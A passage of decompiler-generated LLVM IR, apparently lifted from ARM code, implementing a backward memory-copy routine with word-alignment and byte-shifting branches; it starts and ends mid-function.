  store i1 %v9_17730, i1* %cpsr_n.global-to-local, align 1
  %v10_17730 = icmp eq i32 %v4_17730, 0
  store i1 %v10_17730, i1* %cpsr_z.global-to-local, align 1
  %v5_17734 = icmp slt i32 %v0_17730, -20
  br i1 %v5_17734, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17734 = load i32, i32* %r1.global-to-local, align 4
  %v7_17734 = add i32 %v6_17734, -4
  %v8_17734 = inttoptr i32 %v7_17734 to i32*
  %v9_17734 = load i32, i32* %v8_17734, align 4
  store i32 %v9_17734, i32* @r3, align 4
  %v10_17734 = add i32 %v6_17734, -8
  %v11_17734 = inttoptr i32 %v10_17734 to i32*
  %v12_17734 = load i32, i32* %v11_17734, align 4
  store i32 %v12_17734, i32* @ip, align 4
  %v13_17734 = add i32 %v6_17734, -12
  %v14_17734 = inttoptr i32 %v13_17734 to i32*
  %v15_17734 = load i32, i32* %v14_17734, align 4
  store i32 %v15_17734, i32* %lr.global-to-local, align 4
  store i32 %v13_17734, i32* %r1.global-to-local, align 4
  %v7_17738 = add i32 %v6_17738, -12
  %v8_17738 = inttoptr i32 %v7_17738 to i32*
  store i32 %v9_17734, i32* %v8_17738, align 4
  %v10_17738 = add i32 %v6_17738, -8
  %v11_17738 = inttoptr i32 %v10_17738 to i32*
  %v12_17738 = load i32, i32* @ip, align 4
  store i32 %v12_17738, i32* %v11_17738, align 4
  %v13_17738 = add i32 %v6_17738, -4
  %v14_17738 = inttoptr i32 %v13_17738 to i32*
  %v15_17738 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17738, i32* %v14_17738, align 4
  store i32 %v7_17738, i32* %r0.global-to-local, align 4
  %v6_1773c = load i32, i32* %r2.global-to-local, align 4
  %v7_1773c = add i32 %v6_1773c, -12
  store i32 %v7_1773c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1775c45 = phi i32 [ %v6_17738, %.thread2 ], [ %v7_17738, %bb148 ]
  %v0_1774443 = phi i32 [ %v4_17730, %.thread2 ], [ %v7_1773c, %bb148 ]
  %v2_17740 = load i8*, i8** %stack_var_-8, align 4
  %v3_17740 = ptrtoint i8* %v2_17740 to i32
  store i32 %v3_17740, i32* @r4, align 4
  store i32 %v8_176fc, i32* @lr, align 4
  br label %dec_label_pc_17744

dec_label_pc_17744:                               ; preds = %dec_label_pc_176f4, %.thread4
  %v7_17754 = phi i32 [ %v0_1770c37, %dec_label_pc_176f4 ], [ %v6_1775c45, %.thread4 ]
  %v0_17744 = phi i32 [ %v2_176f4, %dec_label_pc_176f4 ], [ %v0_1774443, %.thread4 ]
  %v2_17744 = add i32 %v0_17744, 8
  store i32 %v2_17744, i32* %r2.global-to-local, align 4
  %v4_17744 = sub i32 0, %v0_17744
  %v5_17744 = and i32 %v2_17744, %v4_17744
  %v6_17744 = icmp slt i32 %v5_17744, 0
  store i1 %v6_17744, i1* %cpsr_v.global-to-local, align 1
  %v7_17744 = icmp slt i32 %v2_17744, 0
  store i1 %v7_17744, i1* %cpsr_n.global-to-local, align 1
  %v8_17744 = icmp eq i32 %v2_17744, 0
  store i1 %v8_17744, i1* %cpsr_z.global-to-local, align 1
  %v5_17748 = icmp slt i32 %v0_17744, -8
  br i1 %v5_17748, label %bb150, label %dec_label_pc_1774c

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17744
  %v6_1774c = add i32 %v0_17744, 4
  store i32 %v6_1774c, i32* %r2.global-to-local, align 4
  %v8_1774c = sub i32 -5, %v0_17744
  %v9_1774c = and i32 %v8_1774c, %v2_17744
  %v10_1774c = icmp slt i32 %v9_1774c, 0
  store i1 %v10_1774c, i1* %cpsr_v.global-to-local, align 1
  %v11_1774c = icmp slt i32 %v6_1774c, 0
  store i1 %v11_1774c, i1* %cpsr_n.global-to-local, align 1
  %v12_1774c = icmp eq i32 %v2_17744, 4
  store i1 %v12_1774c, i1* %cpsr_z.global-to-local, align 1
  %v5_17750 = icmp slt i32 %v2_17744, 4
  %v6_17750 = load i32, i32* %r1.global-to-local, align 4
  %v7_17750 = add i32 %v6_17750, -4
  %v8_17750 = inttoptr i32 %v7_17750 to i32*
  %v9_17750 = load i32, i32* %v8_17750, align 4
  store i32 %v9_17750, i32* @r3, align 4
  br i1 %v5_17750, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1774c
  store i32 %v7_17750, i32* %r1.global-to-local, align 4
  %v8_17754 = add i32 %v7_17754, -4
  %v9_17754 = inttoptr i32 %v8_17754 to i32*
  store i32 %v9_17750, i32* %v9_17754, align 4
  %v10_17754 = load i32, i32* %r0.global-to-local, align 4
  %v11_17754 = add i32 %v10_17754, -4
  store i32 %v11_17754, i32* %r0.global-to-local, align 4
  %v0_17764.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1774c
  %v10_17758 = add i32 %v6_17750, -8
  %v11_17758 = inttoptr i32 %v10_17758 to i32*
  %v12_17758 = load i32, i32* %v11_17758, align 4
  store i32 %v12_17758, i32* @ip, align 4
  store i32 %v10_17758, i32* %r1.global-to-local, align 4
  %v7_1775c = add i32 %v7_17754, -8
  %v8_1775c = inttoptr i32 %v7_1775c to i32*
  store i32 %v9_17750, i32* %v8_1775c, align 4
  %v10_1775c = add i32 %v7_17754, -4
  %v11_1775c = inttoptr i32 %v10_1775c to i32*
  %v12_1775c = load i32, i32* @ip, align 4
  store i32 %v12_1775c, i32* %v11_1775c, align 4
  store i32 %v7_1775c, i32* %r0.global-to-local, align 4
  %v6_17760 = load i32, i32* %r2.global-to-local, align 4
  %v7_17760 = add i32 %v6_17760, -4
  store i32 %v7_17760, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %dec_label_pc_17744, %dec_label_pc_176d4, %.thread14, %dec_label_pc_17908, %dec_label_pc_1789c, %dec_label_pc_17830, %bb149
  %v2_17768 = phi i32 [ %v11_17754, %.thread8 ], [ %v7_17754, %dec_label_pc_17744 ], [ %v2_176d8, %dec_label_pc_176d4 ], [ %v0_1780020, %.thread14 ], [ %v2_1777453, %dec_label_pc_17908 ], [ %v2_1777452, %dec_label_pc_1789c ], [ %v2_1777451, %dec_label_pc_17830 ], [ %v7_1775c, %bb149 ]
  %v0_17764 = phi i32 [ %v0_17764.pre, %.thread8 ], [ %v2_17744, %dec_label_pc_17744 ], [ %v2_176dc, %dec_label_pc_176d4 ], [ %v2_177a8, %.thread14 ], [ %v0_1776449, %dec_label_pc_17908 ], [ %v0_1776448, %dec_label_pc_1789c ], [ %v0_1776447, %dec_label_pc_17830 ], [ %v7_17760, %bb149 ]
  %v1_17764 = add i32 %v0_17764, 4
  store i32 %v1_17764, i32* @r2, align 4
  %v3_17764 = sub i32 0, %v0_17764
  %v4_17764 = and i32 %v1_17764, %v3_17764
  %v5_17764 = icmp slt i32 %v4_17764, 0
  store i1 %v5_17764, i1* %cpsr_v.global-to-local, align 1
  %v6_17764 = icmp slt i32 %v1_17764, 0
  store i1 %v6_17764, i1* %cpsr_n.global-to-local, align 1
  %v7_17764 = icmp eq i32 %v1_17764, 0
  store i1 %v7_17764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17764, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1776c = add i32 %v0_17764, 2
  %v3_1776c = sub i32 -3, %v0_17764
  %v4_1776c = and i32 %v3_1776c, %v1_17764
  %v5_1776c = icmp slt i32 %v4_1776c, 0
  store i1 %v5_1776c, i1* %cpsr_v.global-to-local, align 1
  %v6_1776c = icmp slt i32 %v1_1776c, 0
  store i1 %v6_1776c, i1* %cpsr_n.global-to-local, align 1
  %v7_1776c = icmp eq i32 %v1_17764, 2
  store i1 %v7_1776c, i1* %cpsr_z.global-to-local, align 1
  %v0_17770 = load i32, i32* %r1.global-to-local, align 4
  %v1_17770 = add i32 %v0_17770, -1
  %v2_17770 = inttoptr i32 %v1_17770 to i8*
  %v3_17770 = load i8, i8* %v2_17770, align 1
  %v4_17770 = zext i8 %v3_17770 to i32
  store i32 %v4_17770, i32* @r3, align 4
  store i32 %v1_17770, i32* %r1.global-to-local, align 4
  %v3_17774 = add i32 %v2_17768, -1
  %v4_17774 = inttoptr i32 %v3_17774 to i8*
  store i8 %v3_17770, i8* %v4_17774, align 1
  %v5_17774 = load i32, i32* %r0.global-to-local, align 4
  %v6_17774 = add i32 %v5_17774, -1
  store i32 %v6_17774, i32* %r0.global-to-local, align 4
  %v0_17778 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17778 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17778 = xor i1 %v0_17778, %v1_17778
  br i1 %v2_17778, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_17778 = load i32, i32* %r1.global-to-local, align 4
  %v4_17778 = add i32 %v3_17778, -1
  %v5_17778 = inttoptr i32 %v4_17778 to i8*
  %v6_17778 = load i8, i8* %v5_17778, align 1
  %v7_17778 = zext i8 %v6_17778 to i32
  store i32 %v7_17778, i32* @r3, align 4
  store i32 %v4_17778, i32* %r1.global-to-local, align 4
  %v6_1777c = add i32 %v5_17774, -2
  %v7_1777c = inttoptr i32 %v6_1777c to i8*
  store i8 %v6_17778, i8* %v7_1777c, align 1
  %v8_1777c = load i32, i32* %r0.global-to-local, align 4
  %v9_1777c = add i32 %v8_1777c, -1
  store i32 %v9_1777c, i32* %r0.global-to-local, align 4
  %v1_17780.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17780.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_17784 = phi i32 [ %v9_1777c, %bb152 ], [ %v6_17774, %bb151 ]
  %v2_17784 = phi i1 [ %v2_17780.pre, %bb152 ], [ %v1_17778, %bb151 ]
  %v1_17784 = phi i1 [ %v1_17780.pre, %bb152 ], [ %v0_17778, %bb151 ]
  %v0_17780 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17780 = xor i1 %v2_17784, %v1_17784
  %v4_17780 = or i1 %v0_17780, %v3_17780
  br i1 %v4_17780, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_17780 = load i32, i32* %r1.global-to-local, align 4
  %v6_17780 = add i32 %v5_17780, -1
  %v7_17780 = inttoptr i32 %v6_17780 to i8*
  %v8_17780 = load i8, i8* %v7_17780, align 1
  %v9_17780 = zext i8 %v8_17780 to i32
  store i32 %v9_17780, i32* @r3, align 4
  store i32 %v6_17780, i32* %r1.global-to-local, align 4
  %v8_17784 = add i32 %v7_17784, -1
  %v9_17784 = inttoptr i32 %v8_17784 to i8*
  store i8 %v8_17780, i8* %v9_17784, align 1
  %v10_17784 = load i32, i32* %r0.global-to-local, align 4
  %v11_17784 = add i32 %v10_17784, -1
  store i32 %v11_17784, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1778c:                               ; preds = %dec_label_pc_176e4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1778c = icmp eq i32 %v1_176e4, 1
  store i1 %v8_1778c, i1* %cpsr_n.global-to-local, align 1
  %v9_1778c = icmp eq i32 %v1_176e4, 2
  store i1 %v9_1778c, i1* %cpsr_z.global-to-local, align 1
  %v1_17790 = add i32 %v2_176d4, -1
  %v2_17790 = inttoptr i32 %v1_17790 to i8*
  %v3_17790 = load i8, i8* %v2_17790, align 1
  %v4_17790 = zext i8 %v3_17790 to i32
  store i32 %v4_17790, i32* @r3, align 4
  store i32 %v1_17790, i32* %r1.global-to-local, align 4
  %v3_17794 = add i32 %v2_176d8, -1
  %v4_17794 = inttoptr i32 %v3_17794 to i8*
  store i8 %v3_17790, i8* %v4_17794, align 1
  %v5_17794 = load i32, i32* %r0.global-to-local, align 4
  %v6_17794 = add i32 %v5_17794, -1
  store i32 %v6_17794, i32* %r0.global-to-local, align 4
  br i1 %v8_1778c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1778c
  %v6_17798 = load i32, i32* %r1.global-to-local, align 4
  %v7_17798 = add i32 %v6_17798, -1
  %v8_17798 = inttoptr i32 %v7_17798 to i8*
  %v9_17798 = load i8, i8* %v8_17798, align 1
  %v10_17798 = zext i8 %v9_17798 to i32
  store i32 %v10_17798, i32* @r3, align 4
  store i32 %v7_17798, i32* %r1.global-to-local, align 4
  %v9_1779c = add i32 %v5_17794, -2
  %v10_1779c = inttoptr i32 %v9_1779c to i8*
  store i8 %v9_17798, i8* %v10_1779c, align 1
  %v11_1779c = load i32, i32* %r0.global-to-local, align 4
  %v12_1779c = add i32 %v11_1779c, -1
  store i32 %v12_1779c, i32* %r0.global-to-local, align 4
  br i1 %v9_1778c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_177a0 = load i32, i32* %r1.global-to-local, align 4
  %v9_177a0 = add i32 %v8_177a0, -1
  %v10_177a0 = inttoptr i32 %v9_177a0 to i8*
  %v11_177a0 = load i8, i8* %v10_177a0, align 1
  %v12_177a0 = zext i8 %v11_177a0 to i32
  store i32 %v12_177a0, i32* @r3, align 4
  store i32 %v9_177a0, i32* %r1.global-to-local, align 4
  %v11_177a4 = add i32 %v11_1779c, -2
  %v12_177a4 = inttoptr i32 %v11_177a4 to i8*
  store i8 %v11_177a0, i8* %v12_177a4, align 1
  %v13_177a4 = load i32, i32* %r0.global-to-local, align 4
  %v14_177a4 = add i32 %v13_177a4, -1
  store i32 %v14_177a4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1778c, %bb155
  %v0_1780020 = phi i32 [ %v12_1779c, %bb154 ], [ %v6_17794, %dec_label_pc_1778c ], [ %v14_177a4, %bb155 ]
  %v0_177a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_177a8 = load i32, i32* @ip, align 4
  %v2_177a8 = sub i32 %v0_177a8, %v1_177a8
  store i32 %v2_177a8, i32* %r2.global-to-local, align 4
  %v4_177a8 = xor i32 %v1_177a8, %v0_177a8
  %v5_177a8 = xor i32 %v2_177a8, %v0_177a8
  %v6_177a8 = and i32 %v5_177a8, %v4_177a8
  %v7_177a8 = icmp slt i32 %v6_177a8, 0
  store i1 %v7_177a8, i1* %cpsr_v.global-to-local, align 1
  %v8_177a8 = icmp slt i32 %v2_177a8, 0
  store i1 %v8_177a8, i1* %cpsr_n.global-to-local, align 1
  %v9_177a8 = icmp eq i32 %v0_177a8, %v1_177a8
  store i1 %v9_177a8, i1* %cpsr_z.global-to-local, align 1
  %v5_177ac = icmp slt i32 %v0_177a8, %v1_177a8
  br i1 %v5_177ac, label %bb150, label %dec_label_pc_177b0

dec_label_pc_177b0:                               ; preds = %.thread14
  %v0_177b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_177b0 = urem i32 %v0_177b0, 4
  store i32 %v1_177b0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_177b0 = icmp eq i32 %v1_177b0, 0
  store i1 %v2_177b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_177b0, label %dec_label_pc_176f4, label %dec_label_pc_177b8

dec_label_pc_177b8:                               ; preds = %dec_label_pc_176ec, %dec_label_pc_177b0
  %v0_1780019 = phi i32 [ %v2_176d8, %dec_label_pc_176ec ], [ %v0_1780020, %dec_label_pc_177b0 ]
  %v0_178ac = phi i32 [ %v2_176dc, %dec_label_pc_176ec ], [ %v2_177a8, %dec_label_pc_177b0 ]
  %v0_177b8 = phi i32 [ %v2_176d4, %dec_label_pc_176ec ], [ %v0_177b0, %dec_label_pc_177b0 ]
  %v0_177c0 = phi i32 [ %v1_176ec, %dec_label_pc_176ec ], [ %v1_177b0, %dec_label_pc_177b0 ]
  %v1_177b8 = and i32 %v0_177b8, -4
  store i32 %v1_177b8, i32* %r1.global-to-local, align 4
  %v1_177bc = inttoptr i32 %v1_177b8 to i32*
  %v2_177bc = load i32, i32* %v1_177bc, align 4
  store i32 %v2_177bc, i32* @r3, align 4
  %v7_177c0 = icmp ult i32 %v0_177c0, 2
  %v2_178a4 = add i32 %v0_178ac, -12
  %v4_178a4 = sub i32 11, %v0_178ac
  %v5_178a4 = and i32 %v4_178a4, %v0_178ac
  %v6_178a4 = icmp slt i32 %v5_178a4, 0
  store i1 %v6_178a4, i1* %cpsr_v.global-to-local, align 1
  %v7_178a4 = icmp slt i32 %v2_178a4, 0
  store i1 %v7_178a4, i1* %cpsr_n.global-to-local, align 1
  %v8_178a4 = icmp eq i32 %v0_178ac, 12
  store i1 %v8_178a4, i1* %cpsr_z.global-to-local, align 1
  %v5_178a8 = icmp slt i32 %v0_178ac, 12
  br i1 %v7_177c0, label %dec_label_pc_178a4, label %dec_label_pc_177c8

dec_label_pc_177c8:                               ; preds = %dec_label_pc_177b8
  %v8_177c0 = icmp eq i32 %v0_177c0, 2
  br i1 %v8_177c0, label %dec_label_pc_17838, label %dec_label_pc_177cc

dec_label_pc_177cc:                               ; preds = %dec_label_pc_177c8
  br i1 %v5_178a8, label %dec_label_pc_17818, label %dec_label_pc_177d4

dec_label_pc_177d4:                               ; preds = %dec_label_pc_177cc
  store i32 %v2_178a4, i32* %r2.global-to-local, align 4
  %v3_177d8 = load i32, i32* @r4, align 4
  store i32 %v3_177d8, i32* %stack_var_-12, align 4
  %v6_177d8 = load i32, i32* @r5, align 4
  %v8_177d8 = inttoptr i32 %v6_177d8 to i8*
  store i8* %v8_177d8, i8** %stack_var_-8, align 4
  %v11_177d8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_177dc

dec_label_pc_177dc:                               ; preds = %dec_label_pc_177dc.dec_label_pc_177dc_crit_edge, %dec_label_pc_177d4
  %v0_17800 = phi i32 [ %v1_17800, %dec_label_pc_177dc.dec_label_pc_177dc_crit_edge ], [ %v0_1780019, %dec_label_pc_177d4 ]
  %v0_177e0 = phi i32 [ %v0_177e0.pre, %dec_label_pc_177dc.dec_label_pc_177dc_crit_edge ], [ %v1_177b8, %dec_label_pc_177d4 ]
  %v0_177dc = phi i32 [ %v0_177dc.pre, %dec_label_pc_177dc.dec_label_pc_177dc_crit_edge ], [ %v2_177bc, %dec_label_pc_177d4 ]
  %v3_177dc = mul i32 %v0_177dc, 256
  store i32 %v3_177dc, i32* %lr.global-to-local, align 4
  %v1_177e0 = add i32 %v0_177e0, -4
  %v2_177e0 = inttoptr i32 %v1_177e0 to i32*
  %v3_177e0 = load i32, i32* %v2_177e0, align 4
  store i32 %v3_177e0, i32* @r3, align 4
  %v4_177e0 = add i32 %v0_177e0, -8
  %v5_177e0 = inttoptr i32 %v4_177e0 to i32*
  %v6_177e0 = load i32, i32* %v5_177e0, align 4
  store i32 %v6_177e0, i32* %r4.global-to-local, align 4
  %v7_177e0 = add i32 %v0_177e0, -12
  %v8_177e0 = inttoptr i32 %v7_177e0 to i32*
  %v9_177e0 = load i32, i32* %v8_177e0, align 4
  store i32 %v9_177e0, i32* %r5.global-to-local, align 4
  %v10_177e0 = add i32 %v0_177e0, -16
  %v11_177e0 = inttoptr i32 %v10_177e0 to i32*
  %v12_177e0 = load i32, i32* %v11_177e0, align 4
  store i32 %v10_177e0, i32* %r1.global-to-local, align 4
  %v4_177e4 = udiv i32 %v12_177e0, 16777216
  %v5_177e4 = or i32 %v4_177e4, %v3_177dc
  store i32 %v5_177e4, i32* %lr.global-to-local, align 4
  %v3_177e8 = mul i32 %v12_177e0, 256
  %v4_177ec = udiv i32 %v9_177e0, 16777216
  %v5_177ec = or i32 %v3_177e8, %v4_177ec
  store i32 %v5_177ec, i32* @ip, align 4
  %v3_177f0 = mul i32 %v9_177e0, 256
  %v4_177f4 = udiv i32 %v6_177e0, 16777216
  %v5_177f4 = or i32 %v3_177f0, %v4_177f4
  store i32 %v5_177f4, i32* %r5.global-to-local, align 4
  %v3_177f8 = mul i32 %v6_177e0, 256
  %v4_177fc = udiv i32 %v3_177e0, 16777216
  %v5_177fc = or i32 %v3_177f8, %v4_177fc
  store i32 %v5_177fc, i32* %r4.global-to-local, align 4
  %v1_17800 = add i32 %v0_17800, -16
  %v2_17800 = inttoptr i32 %v1_17800 to i32*
  store i32 %v5_177fc, i32* %v2_17800, align 4
  %v4_17800 = add i32 %v0_17800, -12
  %v5_17800 = inttoptr i32 %v4_17800 to i32*
  %v6_17800 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17800, i32* %v5_17800, align 4
  %v7_17800 = add i32 %v0_17800, -8
  %v8_17800 = inttoptr i32 %v7_17800 to i32*
  %v9_17800 = load i32, i32* @ip, align 4
  store i32 %v9_17800, i32* %v8_17800, align 4
  %v10_17800 = add i32 %v0_17800, -4
  %v11_17800 = inttoptr i32 %v10_17800 to i32*
  %v12_17800 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17800, i32* %v11_17800, align 4
  store i32 %v1_17800, i32* %r0.global-to-local, align 4
  %v0_17804 = load i32, i32* %r2.global-to-local, align 4
  %v2_17804 = add i32 %v0_17804, -16
  store i32 %v2_17804, i32* %r2.global-to-local, align 4
  %v6_17808 = icmp slt i32 %v0_17804, 16
  br i1 %v6_17808, label %dec_label_pc_1780c, label %dec_label_pc_177dc.dec_label_pc_177dc_crit_edge

dec_label_pc_177dc.dec_label_pc_177dc_crit_edge:  ; preds = %dec_label_pc_177dc
  %v0_177dc.pre = load i32, i32* @r3, align 4
  %v0_177e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_177dc

dec_label_pc_1780c:                               ; preds = %dec_label_pc_177dc
  %v2_1780c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1780c, i32* @r4, align 4
  %v5_1780c = load i8*, i8** %stack_var_-8, align 4
  %v6_1780c = ptrtoint i8* %v5_1780c to i32
  store i32 %v6_1780c, i32* @r5, align 4
  store i32 %v11_177d8, i32* @lr, align 4
  %v2_17810 = add i32 %v0_17804, -4
  store i32 %v2_17810, i32* %r2.global-to-local, align 4
  %v4_17810 = add i32 %v0_17804, 2147483632
  %v5_17810 = and i32 %v2_17810, %v4_17810
  %v6_17810 = icmp slt i32 %v5_17810, 0
  store i1 %v6_17810, i1* %cpsr_v.global-to-local, align 1
  %v7_17810 = icmp slt i32 %v2_17810, 0
  store i1 %v7_17810, i1* %cpsr_n.global-to-local, align 1
  %v8_17810 = icmp eq i32 %v2_17810, 0
  store i1 %v8_17810, i1* %cpsr_z.global-to-local, align 1
  %v5_17814 = icmp slt i32 %v2_17804, -12
  br i1 %v5_17814, label %dec_label_pc_17830, label %dec_label_pc_17818

dec_label_pc_17818:                               ; preds = %dec_label_pc_1780c, %dec_label_pc_177cc, %dec_label_pc_17818
  %v1_17824 = phi i32 [ %v5_17824, %dec_label_pc_17818 ], [ %v1_17800, %dec_label_pc_1780c ], [ %v0_1780019, %dec_label_pc_177cc ]
  %v0_17818 = load i32, i32* @r3, align 4
  %v3_17818 = mul i32 %v0_17818, 256
  store i32 %v3_17818, i32* %ip.global-to-local, align 4
  %v0_1781c = load i32, i32* %r1.global-to-local, align 4
  %v1_1781c = add i32 %v0_1781c, -4
  %v2_1781c = inttoptr i32 %v1_1781c to i32*
  %v3_1781c = load i32, i32* %v2_1781c, align 4
  store i32 %v3_1781c, i32* @r3, align 4
  store i32 %v1_1781c, i32* %r1.global-to-local, align 4
  %v4_17820 = udiv i32 %v3_1781c, 16777216
  %v5_17820 = or i32 %v4_17820, %v3_17818
  store i32 %v5_17820, i32* @ip, align 4
  %v2_17824 = add i32 %v1_17824, -4
  %v3_17824 = inttoptr i32 %v2_17824 to i32*
  store i32 %v5_17820, i32* %v3_17824, align 4
  %v4_17824 = load i32, i32* %r0.global-to-local, align 4
  %v5_17824 = add i32 %v4_17824, -4
  store i32 %v5_17824, i32* %r0.global-to-local, align 4
  %v0_17828 = load i32, i32* %r2.global-to-local, align 4
  %v2_17828 = add i32 %v0_17828, -4
  store i32 %v2_17828, i32* %r2.global-to-local, align 4
  %v6_1782c = icmp slt i32 %v0_17828, 4
  br i1 %v6_1782c, label %dec_label_pc_17830.loopexit, label %dec_label_pc_17818

dec_label_pc_17830.loopexit:                      ; preds = %dec_label_pc_17818
  %v4_17828 = sub i32 3, %v0_17828
  %v5_17828 = and i32 %v4_17828, %v0_17828
  %v6_17828 = icmp slt i32 %v5_17828, 0
  %v7_17828 = icmp slt i32 %v2_17828, 0
  store i1 %v6_17828, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17828, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17830

dec_label_pc_17830:                               ; preds = %dec_label_pc_17830.loopexit, %dec_label_pc_1780c
  %v2_1777451 = phi i32 [ %v5_17824, %dec_label_pc_17830.loopexit ], [ %v1_17800, %dec_label_pc_1780c ]
  %v0_1776447 = phi i32 [ %v2_17828, %dec_label_pc_17830.loopexit ], [ %v2_17810, %dec_label_pc_1780c ]
  %v0_17830 = load i32, i32* %r1.global-to-local, align 4
  %v1_17830 = add i32 %v0_17830, 3
  store i32 %v1_17830, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17838:                               ; preds = %dec_label_pc_177c8
  br i1 %v5_178a8, label %dec_label_pc_17884, label %dec_label_pc_17840

dec_label_pc_17840:                               ; preds = %dec_label_pc_17838
  store i32 %v2_178a4, i32* %r2.global-to-local, align 4
  %v3_17844 = load i32, i32* @r4, align 4
  store i32 %v3_17844, i32* %stack_var_-12, align 4
  %v6_17844 = load i32, i32* @r5, align 4
  %v8_17844 = inttoptr i32 %v6_17844 to i8*
  store i8* %v8_17844, i8** %stack_var_-8, align 4
  %v11_17844 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17848

dec_label_pc_17848:                               ; preds = %dec_label_pc_17848.dec_label_pc_17848_crit_edge, %dec_label_pc_17840
  %v0_1786c = phi i32 [ %v1_1786c, %dec_label_pc_17848.dec_label_pc_17848_crit_edge ], [ %v0_1780019, %dec_label_pc_17840 ]
  %v0_1784c = phi i32 [ %v0_1784c.pre, %dec_label_pc_17848.dec_label_pc_17848_crit_edge ], [ %v1_177b8, %dec_label_pc_17840 ]
  %v0_17848 = phi i32 [ %v0_17848.pre, %dec_label_pc_17848.dec_label_pc_17848_crit_edge ], [ %v2_177bc, %dec_label_pc_17840 ]
  %v3_17848 = mul i32 %v0_17848, 65536
  store i32 %v3_17848, i32* %lr.global-to-local, align 4
  %v1_1784c = add i32 %v0_1784c, -4
  %v2_1784c = inttoptr i32 %v1_1784c to i32*
  %v3_1784c = load i32, i32* %v2_1784c, align 4
  store i32 %v3_1784c, i32* @r3, align 4
  %v4_1784c = add i32 %v0_1784c, -8
  %v5_1784c = inttoptr i32 %v4_1784c to i32*
  %v6_1784c = load i32, i32* %v5_1784c, align 4
  store i32 %v6_1784c, i32* %r4.global-to-local, align 4
  %v7_1784c = add i32 %v0_1784c, -12
  %v8_1784c = inttoptr i32 %v7_1784c to i32*
  %v9_1784c = load i32, i32* %v8_1784c, align 4
  store i32 %v9_1784c, i32* %r5.global-to-local, align 4
  %v10_1784c = add i32 %v0_1784c, -16
  %v11_1784c = inttoptr i32 %v10_1784c to i32*
  %v12_1784c = load i32, i32* %v11_1784c, align 4
  store i32 %v10_1784c, i32* %r1.global-to-local, align 4
  %v4_17850 = udiv i32 %v12_1784c, 65536
  %v5_17850 = or i32 %v4_17850, %v3_17848
  store i32 %v5_17850, i32* %lr.global-to-local, align 4
  %v3_17854 = mul i32 %v12_1784c, 65536
  %v4_17858 = udiv i32 %v9_1784c, 65536
  %v5_17858 = or i32 %v3_17854, %v4_17858
  store i32 %v5_17858, i32* @ip, align 4
  %v3_1785c = mul i32 %v9_1784c, 65536
  %v4_17860 = udiv i32 %v6_1784c, 65536
  %v5_17860 = or i32 %v3_1785c, %v4_17860
  store i32 %v5_17860, i32* %r5.global-to-local, align 4
  %v3_17864 = mul i32 %v6_1784c, 65536
  %v4_17868 = udiv i32 %v3_1784c, 65536
  %v5_17868 = or i32 %v3_17864, %v4_17868
  store i32 %v5_17868, i32* %r4.global-to-local, align 4
  %v1_1786c = add i32 %v0_1786c, -16
  %v2_1786c = inttoptr i32 %v1_1786c to i32*
  store i32 %v5_17868, i32* %v2_1786c, align 4
  %v4_1786c = add i32 %v0_1786c, -12
  %v5_1786c = inttoptr i32 %v4_1786c to i32*
  %v6_1786c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1786c, i32* %v5_1786c, align 4
  %v7_1786c = add i32 %v0_1786c, -8
  %v8_1786c = inttoptr i32 %v7_1786c to i32*
  %v9_1786c = load i32, i32* @ip, align 4
  store i32 %v9_1786c, i32* %v8_1786c, align 4
  %v10_1786c = add i32 %v0_1786c, -4
  %v11_1786c = inttoptr i32 %v10_1786c to i32*
  %v12_1786c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1786c, i32* %v11_1786c, align 4
  store i32 %v1_1786c, i32* %r0.global-to-local, align 4
  %v0_17870 = load i32, i32* %r2.global-to-local, align 4
  %v2_17870 = add i32 %v0_17870, -16
  store i32 %v2_17870, i32* %r2.global-to-local, align 4
  %v6_17874 = icmp slt i32 %v0_17870, 16
  br i1 %v6_17874, label %dec_label_pc_17878, label %dec_label_pc_17848.dec_label_pc_17848_crit_edge

dec_label_pc_17848.dec_label_pc_17848_crit_edge:  ; preds = %dec_label_pc_17848
  %v0_17848.pre = load i32, i32* @r3, align 4
  %v0_1784c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17848

dec_label_pc_17878:                               ; preds = %dec_label_pc_17848
  %v2_17878 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17878, i32* @r4, align 4
